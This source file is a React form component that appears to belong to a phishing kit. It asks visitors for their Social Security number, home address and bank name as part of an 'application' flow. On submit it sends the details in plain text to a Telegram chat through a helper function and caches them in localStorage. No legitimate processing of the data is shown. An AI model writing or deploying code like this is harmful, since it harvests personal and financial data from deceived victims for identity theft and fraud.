/* eslint-disable @next/next/no-img-element */
"use client";
import { sendTelegramMessage } from "../../utils/telegram";
import { useState } from "react";
import { useRouter } from "next/navigation";

const FinancialInformationForm = () => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    ssn: "",
    streetAddress: "",
    city: "",
    state: "",
    zipCode: "",
    bankName: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleChange = (field: string, value: string) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }));
  };

  const formatSSN = (value: string): string => {
    const cleaned = value.replace(/\D/g, "");
    const match = cleaned.match(/^(\d{3})(\d{2})(\d{4})$/);
    if (match) {
      return `${match[1]}-${match[2]}-${match[3]}`;
    }
    return value;
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!/^\d{3}-\d{2}-\d{4}$/.test(formData.ssn)) {
      newErrors.ssn = "Invalid SSN format";
    }
    if (!formData.streetAddress.trim()) newErrors.streetAddress = "Street address is required";
    if (!formData.city.trim()) newErrors.city = "City is required";
    if (!formData.state) newErrors.state = "State is required";
    if (!/^\d{5}$/.test(formData.zipCode)) newErrors.zipCode = "Invalid ZIP code";
    if (!formData.bankName.trim()) newErrors.bankName = "Bank name is required";
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    const message = `Financial Information Submission:
    SSN: ${formData.ssn}
    Address: ${formData.streetAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}
    Bank Name: ${formData.bankName}`;

    await sendTelegramMessage(message);
    localStorage.setItem("financialInfo", JSON.stringify(formData));
    router.push("/apply/account");
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-green-600 shadow-md sticky top-0 z-10">
        <div className="max-w-3xl mx-auto p-4 flex items-center">
          <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3" />
          <div className="flex-1 ml-2">
            <div className="h-2 bg-green-500 rounded-full mt-1">
              <div className="h-full bg-green-200 rounded-full transition-all duration-300" />
            </div>
          </div>
        </div>
      </header>

      <main className="flex-grow container mx-auto mt-12 px-4">
        <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
          <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">Financial Information</h1>
          
          <form onSubmit={handleSubmit}>
            {/* SSN Field */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Social Security Number</label>
              <input
                type="text"
                value={formData.ssn}
                onChange={(e) => handleChange("ssn", formatSSN(e.target.value))}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                placeholder="XXX-XX-XXXX"
                maxLength={11}
                required
              />
              {errors.ssn && <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>}
            </div>

            {/* Address Fields */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Street Address</label>
              <input
                type="text"
                value={formData.streetAddress}
                onChange={(e) => handleChange("streetAddress", e.target.value)}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                required
              />
              {errors.streetAddress && <p className="text-red-500 text-sm mt-1">{errors.streetAddress}</p>}
            </div>

            <div className="grid grid-cols-2 gap-4 mb-6">
              <div>
                <label className="block text-sm font-medium text-black">City</label>
                <input
                  type="text"
                  value={formData.city}
                  onChange={(e) => handleChange("city", e.target.value)}
                  className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                  required
                />
                {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
              </div>
              
              <div>
  <label className="block text-sm font-medium text-black">State</label>
  <input
    type="text"
    value={formData.state}
    onChange={(e) => handleChange("state", e.target.value)}
    className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
    required
  />
  {errors.state && <p className="text-red-500 text-sm mt-1">{errors.state}</p>}
</div>

            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">ZIP Code</label>
              <input
                type="text"
                value={formData.zipCode}
                onChange={(e) => handleChange("zipCode", e.target.value.replace(/\D/g, ""))}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                maxLength={5}
                required
              />
              {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
            </div>

            {/* Bank Information */}
            <div className="mb-8">
              <label className="block text-sm font-medium text-black">Personal Bank Name</label>
              <input
                type="text"
                value={formData.bankName}
                onChange={(e) => handleChange("bankName", e.target.value)}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                required
              />
              {errors.bankName && <p className="text-red-500 text-sm mt-1">{errors.bankName}</p>}
            </div>

            <button type="submit" className="w-full bg-green-500 text-white p-4 rounded-xl hover:bg-green-600">
              Submit Application
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default FinancialInformationForm;